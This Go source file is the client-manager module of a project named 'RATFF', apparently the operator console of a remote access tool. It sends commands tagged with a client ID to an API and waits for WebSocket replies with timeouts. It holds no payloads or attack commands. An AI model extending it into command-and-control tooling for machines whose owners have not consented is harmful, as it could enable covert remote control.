package client

import (
	"sync"
	"time"

	"RATFF/server_cli/api"
	"RATFF/shared"
)

// PendingCommand holds a channel waiting for a command response.
type PendingCommand struct {
	ch chan shared.Message
}

// PrintFuncs holds print functions for output.
type PrintFuncs struct {
	Success     func(string)
	Error       func(string)
	Info        func(string)
	Warn        func(string)
	FormatBytes func(int64) string
}

// Manager handles client operations with pending command tracking.
type Manager struct {
	apiClient  *api.Client
	pendingMu  sync.Mutex
	pendingCmd map[string]*PendingCommand
	T          func(string) string
	Tf         func(string, ...interface{}) string
	Print      PrintFuncs
}

// NewManager creates a new client manager.
func NewManager(apiClient *api.Client, t func(string) string, tf func(string, ...interface{}) string, printFuncs PrintFuncs) *Manager {
	return &Manager{
		apiClient:  apiClient,
		pendingCmd: make(map[string]*PendingCommand),
		T:          t,
		Tf:         tf,
		Print:      printFuncs,
	}
}

func (m *Manager) postCommand(payload map[string]interface{}) error {
	return m.apiClient.PostCommand(payload)
}

// WaitForResponse waits for a command response.
func (m *Manager) WaitForResponse(id string, cmd shared.CommandType, payload map[string]interface{}, timeout time.Duration) bool {
	return m.WaitForResponseWithMsg(id, cmd, payload, timeout) != nil
}

// WaitForResponseWithMsg waits for a command response and returns the message.
func (m *Manager) WaitForResponseWithMsg(id string, cmd shared.CommandType, payload map[string]interface{}, timeout time.Duration) *shared.Message {
	fullPayload := map[string]interface{}{
		"client_id": id,
		"command":   string(cmd),
		"payload":   payload,
	}

	msg := m.sendCommandRaw(id, fullPayload, timeout)
	if msg == nil {
		return nil
	}

	if msg.Payload != nil {
		if errMsg, ok := msg.Payload["error"].(string); ok {
			m.Print.Error(m.Tf("operation_failed", errMsg))
			return nil
		}
	}
	return msg
}

// WaitForResponseRaw waits for a command response without error checking.
func (m *Manager) WaitForResponseRaw(id string, cmd shared.CommandType, payload map[string]interface{}, timeout time.Duration) *shared.Message {
	fullPayload := map[string]interface{}{
		"client_id": id,
		"command":   string(cmd),
		"payload":   payload,
	}

	return m.sendCommandRaw(id, fullPayload, timeout)
}

func (m *Manager) sendCommandRaw(id string, fullPayload map[string]interface{}, timeout time.Duration) *shared.Message {
	ch := make(chan shared.Message, 1)
	m.pendingMu.Lock()
	m.pendingCmd[id] = &PendingCommand{ch: ch}
	m.pendingMu.Unlock()

	if err := m.postCommand(fullPayload); err != nil {
		m.Print.Error(m.Tf("send_command_failed", err))
		m.pendingMu.Lock()
		delete(m.pendingCmd, id)
		m.pendingMu.Unlock()
		return nil
	}

	select {
	case msg := <-ch:
		m.pendingMu.Lock()
		delete(m.pendingCmd, id)
		m.pendingMu.Unlock()
		return &msg
	case <-time.After(timeout):
		m.Print.Error(m.T("command_timeout"))
		m.pendingMu.Lock()
		delete(m.pendingCmd, id)
		m.pendingMu.Unlock()
		return nil
	}
}

// HandleMessage routes incoming WebSocket messages to pending commands.
func (m *Manager) HandleMessage(msg shared.Message) {
	m.pendingMu.Lock()
	defer m.pendingMu.Unlock()

	if pc, ok := m.pendingCmd[msg.ClientID]; ok {
		select {
		case pc.ch <- msg:
		default:
		}
		delete(m.pendingCmd, msg.ClientID)
	}
}
